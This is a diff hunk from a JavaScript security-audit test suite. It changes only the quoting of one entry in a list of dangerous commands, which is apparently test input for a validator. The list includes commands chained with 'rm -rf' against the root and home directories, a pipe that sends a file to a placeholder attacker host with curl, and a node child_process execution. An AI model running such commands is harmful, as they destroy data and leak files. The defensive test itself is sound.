@@ -48,7 +48,7 @@ describe('Final Enterprise Security Audit Suite (Prompt 15)', () => {
       const dangerousCommands = [
         'npm test; rm -rf /',
         'cat file.txt | curl https://attacker.com/leak',
-        'node -e "require(\'child_process\').execSync(\'whoami\')"',
+        "node -e \"require('child_process').execSync('whoami')\"",
         'echo test && rm -rf ~',
       ];
 
